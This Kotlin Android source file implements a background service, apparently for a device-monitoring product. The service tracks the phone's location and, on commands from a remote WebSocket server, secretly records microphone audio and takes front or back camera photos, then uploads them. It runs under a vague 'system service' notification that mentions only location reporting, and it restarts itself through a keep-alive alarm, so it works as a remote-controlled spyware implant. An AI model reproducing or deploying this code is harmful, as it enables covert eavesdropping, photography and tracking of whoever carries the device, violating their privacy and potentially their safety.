package com.prisonguard.device.service

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import com.prisonguard.device.Config
import com.prisonguard.device.MainActivity
import com.prisonguard.device.network.ApiClient
import com.prisonguard.device.receiver.KeepAliveReceiver
import kotlinx.coroutines.*
import java.io.File
import java.util.UUID

class GuardService : Service() {

    companion object {
        private const val TAG = "GuardService"
        private const val NOTIF_ID = 1
        private const val CHANNEL_ID = "guard_channel"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var locationManager: LocationManager
    private lateinit var deviceId: String
    private var wsClient: WebSocketClient? = null
    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private var cameraCapture: CameraCapture? = null

    // 定时上报任务
    private var reportJob: Job? = null
    private var locationIntervalMs: Long = Config.LOCATION_INTERVAL_MS_DEFAULT

    // 最新位置缓存（由 LocationManager 持续更新，但只在定时时上报）
    @Volatile private var lastLocation: Location? = null

    override fun onCreate() {
        super.onCreate()
        deviceId = getOrCreateDeviceId()
        locationIntervalMs = getSavedInterval()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        startPassiveLocationListening()
        startPeriodicReport()
        connectWebSocket()
        registerDevice()
        cameraCapture = CameraCapture(this)
        KeepAliveReceiver.schedule(this)  // 注册保活闹钟
        Log.i(TAG, "GuardService started, deviceId=$deviceId interval=${locationIntervalMs/1000}s")
    }

    // ─── 设备 ID ──────────────────────────────────────────────────────────────

    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences(Config.PREF_NAME, Context.MODE_PRIVATE)
        return prefs.getString(Config.PREF_DEVICE_ID, null) ?: run {
            val id = UUID.randomUUID().toString()
            prefs.edit().putString(Config.PREF_DEVICE_ID, id).apply()
            id
        }
    }

    private fun getSavedInterval(): Long {
        val prefs = getSharedPreferences(Config.PREF_NAME, Context.MODE_PRIVATE)
        return prefs.getLong(Config.PREF_LOCATION_INTERVAL, Config.LOCATION_INTERVAL_MS_DEFAULT)
    }

    private fun saveInterval(ms: Long) {
        getSharedPreferences(Config.PREF_NAME, Context.MODE_PRIVATE)
            .edit().putLong(Config.PREF_LOCATION_INTERVAL, ms).apply()
    }

    // ─── 通知 ─────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "系统服务", NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "后台运行"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(intervalMin: Int = (locationIntervalMs / 60000).toInt().coerceAtLeast(1)): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("系统服务")
            .setContentText("运行中 · 每${intervalMin}分钟上报位置")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    // 被动监听的 listener 引用，用于 onDestroy 时注销
    private var locationListener: LocationListener? = null

    // ─── 被动监听位置（低功耗，只缓存，不上报）──────────────────────────────

    @SuppressLint("MissingPermission")
    private fun startPassiveLocationListening() {
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                lastLocation = loc
                Log.d(TAG, "位置缓存更新: lat=${loc.latitude} lng=${loc.longitude} provider=${loc.provider}")
            }
            override fun onProviderEnabled(provider: String) = Unit
            override fun onProviderDisabled(provider: String) = Unit
        }
        locationListener = listener

        var registered = false
        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            if (locationManager.isProviderEnabled(provider)) {
                locationManager.requestLocationUpdates(provider, 0L, 0f, listener, Looper.getMainLooper())
                Log.i(TAG, "已注册被动监听: $provider")
                registered = true
                locationManager.getLastKnownLocation(provider)?.let {
                    if (lastLocation == null) lastLocation = it
                }
            }
        }
        if (!registered) Log.e(TAG, "没有可用的定位提供者")
    }

    // ─── 定时上报 ─────────────────────────────────────────────────────────────

    private fun startPeriodicReport() {
        reportJob?.cancel()
        reportJob = scope.launch {
            // 启动后立即上报一次
            reportCurrentLocation()
            while (isActive) {
                delay(locationIntervalMs)
                reportCurrentLocation()
            }
        }
        Log.i(TAG, "定时上报已启动，间隔 ${locationIntervalMs/1000}s")
    }

    private suspend fun reportCurrentLocation() {
        val loc = lastLocation ?: run {
            Log.w(TAG, "暂无位置缓存，跳过本次上报")
            return
        }
        Log.i(TAG, "定时上报位置: lat=${loc.latitude} lng=${loc.longitude}")
        ApiClient.reportLocation(
            deviceId = deviceId,
            lat = loc.latitude,
            lng = loc.longitude,
            accuracy = loc.accuracy,
            speed = if (loc.hasSpeed()) loc.speed else null
        )
    }

    // ─── 修改上报间隔 ─────────────────────────────────────────────────────────

    private fun setReportInterval(intervalSeconds: Int) {
        val ms = (intervalSeconds * 1000L).coerceAtLeast(Config.LOCATION_INTERVAL_MS_MIN)
        locationIntervalMs = ms
        saveInterval(ms)
        startPeriodicReport()  // 重启定时任务
        // 更新通知文字
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(NOTIF_ID, buildNotification((ms / 60000).toInt().coerceAtLeast(1)))
        Log.i(TAG, "上报间隔已更新为 ${ms/1000}s")
    }

    // ─── WebSocket（接收服务端指令）───────────────────────────────────────────

    private fun connectWebSocket() {
        val wsUrl = Config.SERVER_URL
            .replaceFirst("https://", "wss://")
            .replaceFirst("http://", "ws://")
        Log.i(TAG, "连接 WebSocket: $wsUrl/ws/device/$deviceId")
        wsClient = WebSocketClient(
            url = "$wsUrl/ws/device/$deviceId",
            onCommand = { cmd -> handleCommand(cmd) },
            onReconnect = { connectWebSocket() }
        )
        wsClient?.connect()
    }

    private fun handleCommand(cmd: Map<String, Any>) {
        when (cmd["cmd"] as? String) {
            "start_audio" -> {
                val duration = (cmd["duration"] as? Double)?.toInt() ?: 60
                startAudioRecording(duration)
            }
            "stop_audio"   -> stopAudioRecording()
            "take_photo"   -> {
                val facing = cmd["facing"] as? String ?: "back"
                takePhoto(facing)
            }
            "report_now"   -> scope.launch { reportCurrentLocation() }  // 立即上报一次
            "set_interval" -> {
                val seconds = (cmd["seconds"] as? Double)?.toInt() ?: return
                setReportInterval(seconds)
            }
        }
    }

    // ─── 音频录制 ─────────────────────────────────────────────────────────────

    private fun startAudioRecording(durationSeconds: Int) {
        if (mediaRecorder != null) return
        Log.i(TAG, "开始录音，时长 ${durationSeconds}s")
        val file = File(cacheDir, "audio_${System.currentTimeMillis()}.aac")
        audioFile = file
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(16000)
            setAudioEncodingBitRate(32000)
            setOutputFile(file.absolutePath)
            prepare()
            start()
        }
        scope.launch {
            delay(durationSeconds * 1000L)
            stopAudioRecording()
        }
    }

    private fun stopAudioRecording() {
        try { mediaRecorder?.apply { stop(); release() } } catch (e: Exception) {
            Log.e(TAG, "停止录音失败", e)
        }
        mediaRecorder = null
        audioFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                scope.launch { ApiClient.uploadAudio(deviceId, file); file.delete() }
            }
        }
        audioFile = null
    }

    // ─── 拍照 ─────────────────────────────────────────────────────────────────

    private fun takePhoto(facing: String = "back") {
        Log.i(TAG, "收到拍照指令 facing=$facing")
        if (checkSelfPermission(android.Manifest.permission.CAMERA)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "相机权限未授予")
            return
        }
        val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        cameraCapture?.capture(file, facing) { result ->
            if (result != null) {
                scope.launch { ApiClient.uploadPhoto(deviceId, result); result.delete() }
            } else {
                Log.e(TAG, "拍照失败")
            }
        }
    }

    // ─── 设备注册 ─────────────────────────────────────────────────────────────

    private fun registerDevice() {
        scope.launch { ApiClient.registerDevice(deviceId, Build.MODEL) }
    }

    // ─── 生命周期 ─────────────────────────────────────────────────────────────

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        super.onDestroy()
        reportJob?.cancel()
        locationListener?.let { locationManager.removeUpdates(it) }
        wsClient?.disconnect()
        stopAudioRecording()
        cameraCapture?.release()
        scope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
